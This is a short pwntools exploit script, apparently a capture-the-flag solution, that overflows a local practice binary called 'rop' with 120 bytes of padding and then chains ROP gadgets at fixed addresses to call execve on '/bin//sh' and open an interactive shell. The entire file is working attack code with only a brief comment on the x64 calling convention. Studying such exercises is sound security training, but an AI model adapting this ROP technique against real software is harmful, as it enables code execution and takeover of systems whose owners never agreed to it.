#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./rop')

"""
x64 calling convention

execve("/bin//sh")

rax = 0x3b
rdi = ptr -> /bin//sh
rsi = 0
rdx = 0
"""

pop_rax_ret = 0x0000000000415724
pop_rdi_ret = 0x0000000000400686
pop_rsi_ret = 0x0000000000410103
pop_rdx_ret = 0x0000000000449945
bin_sh = 0x4925c7
syscall = 0x000000000040126c

padding = 'a'*120

rop = flat(
    pop_rax_ret, 0x3b, pop_rdi_ret, bin_sh,
    pop_rsi_ret, 0, pop_rdx_ret, 0, syscall
)

r.sendline(padding + rop)

r.interactive()
